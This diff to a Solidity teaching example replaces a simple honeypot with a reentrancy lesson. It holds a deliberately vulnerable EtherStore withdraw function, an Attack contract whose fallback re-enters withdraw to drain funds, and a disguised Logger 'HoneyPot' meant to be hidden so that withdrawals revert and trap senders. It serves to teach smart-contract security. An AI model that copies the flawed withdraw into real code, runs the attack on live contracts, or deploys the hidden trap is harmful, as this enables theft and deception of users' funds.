@@ -1,37 +1,76 @@
 // SPDX-License-Identifier: MIT 
-// Honeypot contract designed to deceive attackers and make them lose their funds
 pragma solidity 0.8.20;
 
-contract Honeypot {
-    address public owner;
-    uint256 public balance;
+contract EtherStore {
+    mapping(address => uint) public balances;
+    Logger logger;
 
-    constructor() {
-        owner = msg.sender;
+    constructor(Logger _logger) {
+        logger = Logger(_logger);
     }
 
-    // A function that allows anyone to deposit Ether into the contract
     function deposit() public payable {
-        balance += msg.value;
+        balances[msg.sender] += msg.value;
+        logger.log(msg.sender,  "Deposit");
     }
-
-  // An intentionally vulnerable withdraw function that will always fail
+ 
     function withdraw() public {
-        require(msg.sender == owner, "Only the contract owner can withdraw.");
-  // Malicious logic to deceive attackers - this function always reverts
-        revert("Withdraw failed! Funds lost.");
+        uint bal = balances[msg.sender];
+        require(bal > 0);
+        (bool sent, ) = msg.sender.call{value: bal}("");
+        require(sent, "Failed to send Ether");
+        balances[msg.sender] = 0;
+        logger.log(msg.sender, "Withdraw");
+    }    
+}
+
+// normal Logger contract
+contract Logger {
+    event Log(address caller, string action);
+
+    function log(address _caller, string memory _action) public {
+        emit Log(_caller, _action);
+    }
+}
+
+// Try to steal ETH from EtherStore using ReEntrancy (Source Code 6-2)
+contract Attack {
+    EtherStore etherStore;
+
+    constructor(EtherStore _etherStore) {
+        etherStore = EtherStore(_etherStore);
     }
 
-    // A function that allows the contract owner to withdraw the funds
-    function ownerWithdraw() public {
-        require(msg.sender == owner, "Only the contract owner can withdraw.");
-        payable(owner).transfer(balance);
-        balance = 0;
+    fallback() external payable {
+        if (address(etherStore).balance >= 1 ether) {
+            etherStore.withdraw();
+        }
     }
 
-   // A fallback function to trap any Ether accidentally sent to the contract
-    receive() external payable {
-  // Malicious logic to deceive attackers - this function always reverts
-        revert("Funds lost.");
+    // Don't forget to put 1 ETH before executing
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw();
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+ 
+// This code can be a separate file that others cannot read it.
+contract HoneyPot {
+    event Log(address caller, string action);
+    function log(address _caller, string memory _action) public {
+        emit Log(_caller, _action);
+        if (equal(_action, "Withdraw")) {
+            revert("It's a trap");
+        }
+    }
+
+    // string compare function to filter action
+    function equal(string memory _a, string memory _b) public pure returns (bool) {
+        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
     }
 }
